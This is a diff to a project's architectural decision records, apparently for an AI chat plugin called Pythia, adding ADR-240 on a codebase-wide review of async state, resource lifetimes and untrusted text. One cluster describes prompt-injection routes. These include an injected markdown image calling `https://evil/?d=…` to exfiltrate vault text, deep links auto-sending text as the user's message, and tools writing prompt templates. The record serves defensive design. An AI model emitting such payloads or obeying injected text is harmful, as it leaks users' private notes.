@@ -1,6 +1,8 @@
 # Pythia — Architectural Decision Records
 
-*Last updated: 2026-09-27 — ADR-239 (a favorite becomes an `==…==` highlight in every note Pythia writes: `services/favoriteHighlights.ts`).*
+*Last updated: 2026-09-28 — ADR-240 (whole-codebase quality and security review: 75 defects fixed; three new engineering principles — an await is a boundary in time, everything started has an owner that ends it, model and web output carry no authority).*
+
+*Previously: 2026-09-27 — ADR-239 (a favorite becomes an `==…==` highlight in every note Pythia writes: `services/favoriteHighlights.ts`).*
 
 *Previously: 2026-09-27 — ADR-238 (every note Pythia writes — the three note tools, Save to note, the archive — turns `⟦cite:…⟧` markers into Markdown footnotes; vault → wikilink, web → the fetched page; `stripCitationMarkers` removed).*
 
@@ -5112,5 +5114,36 @@ Auto-search (ADR-099) armed on everyday words ("now", "update", "cost") and on a
 **Not done.** A favorite that cannot be found (its message changed, a legacy favorite with no text, or a selection over several blocks that `findRange` could not repaint either, D-23) is skipped without a word: the note is written, and the missing mark is visible in the note itself. The chat, the navigator and *Save to inbox* are unchanged. See D-67.
 
 **Guards.** `tests/favoriteHighlights.test.ts`: plain, bold, link, partial-bold, occurrence, whitespace, list prefix, wikilink and code span atomic, fenced block untouched, no doubled highlight, no crossing table cells, overlapping favorites merged, a missing one skipped, chip numbers read and kept outside the highlight, and a favorite found in text the model writes with other citation numbers. `tests/conversationArchive.test.ts`, `tests/NoteWriter.test.ts` and `tests/noteFootnotes.test.ts` cover the three doors.
+
+---
+
+## ADR-240 — Third whole-codebase review: time, lifetime and authority
+
+**Status:** Active · 2026-09-28
+
+**Context.** A senior-engineer review of the whole codebase (six parallel reviewers: security, providers, persistence, core UI, remaining UI, tooling) found 75 defects, all fixed in the same change and listed in `docs/engineering-review.md` under *Review — 2026-09-28*. Principles 1–6 (ADR-159/161) held up: most findings were not violations of them. Three shapes were new, and each accounted for a cluster.
+
+1. **State read before an await and written after it** (13 findings). `applyCap` returned a list computed before its archive writes and assigned it over the live one (a conversation created meanwhile vanished); a dirty mark set during an in-flight write was cleared by it (the newest turn lost on quit); two full renders interleaved into one list; a late "by meaning" result landed in the related list; the auto title overwrote a rename made while it generated; a summary was written to a conversation object a reload had replaced; Resume set its mode before the summary call that could fail.
+2. **Something started that nothing ends** (11 findings). Stop was not recognised as an abort (the SDKs' `APIUserAbortError` has `name === "Error"`), so it was retried and reported as a network error; Stop could not end a pending write confirmation, and a later click still wrote the note; render children accumulated on the view for its whole life; document listeners, a ResizeObserver and a pin body outlived the leaf; a meaning-search timer fired after the panel closed.
+3. **Untrusted text given the user's authority** (6 findings). Rendered answers fetched remote images at once, so an injected `![](https://evil/?d=…)` exfiltrated vault text without a click or a tool call; a deep link auto-sent its text as the user's message, which armed search and admitted its links to `read_url`; `create_note` could write a prompt template; every link printed in a fetched page became readable.
+
+**Decision.** Three principles join the canonical list in `CLAUDE.md`:
+
+7. **An await is a boundary in time.** After an `await`, re-read what you are about to write — by id from the store, not the captured object — and confirm the world you started in still holds (a generation counter, a name still equal to what you asked about, a mark unchanged). Never write back a value computed before the await.
+8. **Everything started has an owner that ends it.** A request, a pending promise, a listener, an observer, a render child or a timer is tied to an owner — the abort signal, a `Component`/`RenderSlot`, the view's `onClose`, the plugin's unload — that ends it. Stop and close must reach every pending thing, including one waiting for the user.
+9. **Model and web output carry no authority.** Text from a model, a fetched page or a link from outside is data: it can never authorize an action, widen what may be read, fetch from the network, or become a standing instruction, without a gesture from the user.
+
+Notable decisions inside the fixes:
+- **Remote media load on demand** (`ui/remoteMedia.ts`): the markdown is rewritten before rendering (a browser starts fetching when an `<img>` gets its `src`, before any DOM pass could see it), then placeholders naming the host load it on a press. `renderAnswerMarkdown` is the one entry point; a test fails on another `MarkdownRenderer.render` call site under `ui/`.
+- **`cmd=inject` prefills, never sends.** The link can come from any page; the user reads the text and presses Send.
+- **A tool never writes a template** (`declaresPythiaTemplate`), and the confirm chip shows the whole path.
+- **`read_url` admits only the addresses a tool returned** (`WebReadScope.addResults`), never links inside a page.
+- **No backwards compatibility** (the product has no outside users): the settings migrations of 1.x–2.x and the Electron `safeStorage` key decryption are removed; an old key is dropped by `mergeSettings` like any unknown key.
+- **Numbers are range-checked at the boundary**: `NUMBER_SETTING_BOUNDS` in `models/settings.ts` is the one table; `mergeSettings` and the conversation overrides fall back to the default (principle 6: to *inherit*) outside it.
+- **`minAppVersion` is 1.11.4**, the version `secretStorage` needs; it was 1.4.0 since 1.0.0. The next release's `versions.json` row carries it.
+
+**Not done.** The provider instances are shared by every open view, so a send in one leaf aborts another's stream (D-68). Notes Pythia writes still carry remote-image syntax, which Obsidian's own reading view fetches (D-69).
+
+**Guards.** Principle 7: `tests/ConversationStore.test.ts` (a re-marked id survives), `tests/viewFixes.test.ts` (a render abandoned mid-switch). Principle 8: `tests/retry.test.ts` and `tests/BaseProvider.test.ts` with the SDKs' real abort classes, `tests/toolCallNoteWrites.test.ts` (Stop declines a pending confirm). Principle 9: `tests/remoteMedia.test.ts` (no remote `src` survives; no other render entry point), `tests/declaresPythiaTemplate.test.ts`, `tests/webReadScope.test.ts` (a link inside a result is refused). Tooling: `noImplicitOverride`, `isolatedModules`, `allowUnreachableCode: false` and `lint --max-warnings 0`; the release workflow runs the four CI steps.
 
 ---
